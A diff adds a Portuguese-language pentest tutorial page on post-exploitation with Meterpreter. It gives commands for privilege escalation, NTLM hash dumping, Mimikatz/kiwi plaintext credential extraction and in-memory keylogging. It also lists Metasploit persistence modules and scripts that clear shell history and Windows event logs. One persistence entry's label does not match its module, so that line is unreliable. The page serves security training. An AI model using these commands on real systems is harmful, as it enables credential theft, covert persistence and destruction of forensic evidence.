@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>11. Pós-Exploração em Sistemas Comprometidos — SecVault</title>
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <a href="../index.html" class="sidebar-title">🛡️ SecVault</a>
+      <span class="sidebar-badge">Knowledge Base</span>
+    </div>
+
+    <div class="nav-group-title">Introdução</div>
+    <ul class="nav-links">
+      <li><a href="../index.html">Visão Geral</a></li>
+    </ul>
+
+    <div class="nav-group-title">Fundamentos & Redes</div>
+    <ul class="nav-links">
+      <li><a href="01-principios-cyberseguranca.html">01. Princípios de Segurança</a></li>
+      <li><a href="02-redes-computadores.html">02. Redes de Computadores</a></li>
+      <li><a href="03-usuarios-linux.html">03. Usuários & Permissões Linux</a></li>
+      <li><a href="04-ssh-linux.html">04. SSH & Acesso Seguro</a></li>
+    </ul>
+
+    <div class="nav-group-title">Reconhecimento & Scanning</div>
+    <ul class="nav-links">
+      <li><a href="05-osint-ciberseguranca.html">05. OSINT & Fontes Abertas</a></li>
+      <li><a href="06-varredura-nmap.html">06. Varredura com Nmap</a></li>
+      <li><a href="07-enumeracao.html">07. Técnicas de Enumeração</a></li>
+    </ul>
+
+    <div class="nav-group-title">Pentest & Exploração</div>
+    <ul class="nav-links">
+      <li><a href="08-fundamentos-pentest.html">08. Fundamentos de Pentest</a></li>
+      <li><a href="09-exploracao-vulnerabilidades.html">09. Exploração de Vulnerabilidades</a></li>
+      <li><a href="10-brute-force-medusa.html">10. Força Bruta & Medusa</a></li>
+      <li><a href="11-pos-exploracao.html" class="active">11. Pós-Exploração & Pivoting</a></li>
+    </ul>
+
+    <div class="nav-group-title">Defesa & Inteligência</div>
+    <ul class="nav-links">
+      <li><a href="12-engenharia-social.html">12. Engenharia Social</a></li>
+      <li><a href="13-deepweb-anonimizacao.html">13. Anonimização & Tor</a></li>
+    </ul>
+  </aside>
+
+  <!-- Main Content -->
+  <main class="main-wrapper">
+    <div class="content-container">
+      <h1>🧗 Pós-Exploração & Pivoting em Ambientes Comprometidos</h1>
+      
+      <blockquote>
+        <strong>Visão Geral:</strong> A fase de <strong>pós-exploração</strong> consolida o acesso obtido no host alvo, escalando privilégios para administrador (root/SYSTEM), extraindo credenciais da memória e garantindo persistência para auditorias de segurança avançadas.
+      </blockquote>
+
+      <h2>1. Coleta e Reconhecimento Local com Meterpreter</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>Comando</th>
+            <th>Resultado Obtido</th>
+            <th>Finalidade</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>sysinfo</code></td>
+            <td>Sistema operacional, arquitetura (x86/x64) e hostname.</td>
+            <td>Panorama geral da máquina.</td>
+          </tr>
+          <tr>
+            <td><code>getuid</code></td>
+            <td>Usuário do processo atual (ex: <code>uid=1000</code> ou <code>NT AUTHORITY\SYSTEM</code>).</td>
+            <td>Verificação de privilégios.</td>
+          </tr>
+          <tr>
+            <td><code>ps</code></td>
+            <td>Listagem de todos os processos em execução.</td>
+            <td>Identificação de antivírus e processos para migração.</td>
+          </tr>
+          <tr>
+            <td><code>migrate &lt;PID&gt;</code></td>
+            <td>Injeta a DLL do Meterpreter dentro de outro processo estável (ex: explorer.exe).</td>
+            <td>Estabilidade e evasão de detecção.</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h2>2. Escalação de Privilégios (Privilege Escalation)</h2>
+      <pre><code># Tentativa automatizada de elevação:
+getsystem
+
+# Caso falhe, utilizar o sugestor de exploits locais:
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run</code></pre>
+
+      <h2>3. Extração de Credenciais & Memória</h2>
+      <pre><code># Extrair hashes NTLM locais (exige SYSTEM no Windows):
+hashdump
+
+# Carregar extensão Mimikatz / Kiwi para extrair senhas em texto claro da memória:
+load kiwi
+creds_all
+
+# Captura de teclas em tempo real (Keylogger em memória):
+keyscan_start
+# ... aguardar digitação do usuário ...
+keyscan_dump
+keyscan_stop</code></pre>
+
+      <h2>4. Técnicas de Persistência</h2>
+      <ul>
+        <li><strong>Criação de Serviço Remoto:</strong> <code>use post/linux/persistence/service</code></li>
+        <li><strong>Registro do Windows (Run Keys):</strong> <code>use post/windows/persistence/persistence_service</code></li>
+        <li><strong>Tarefas Agendadas / Crontab:</strong> <code>use post/linux/gather/cron_backdoor</code></li>
+      </ul>
+
+      <h2>5. Limpeza de Evidências (Anti-Forense)</h2>
+      <pre><code># No Linux:
+run post/linux/manage/clear_history
+
+# No Windows:
+run post/windows/manage/clear_event_logs</code></pre>
+    </div>
+
+    <footer>
+      <p>&copy; 2026 Cybersecurity Knowledge Vault — Mantido por <strong>M0RCEGG0</strong>.</p>
+    </footer>
+  </main>
+
+</body>
+</html>
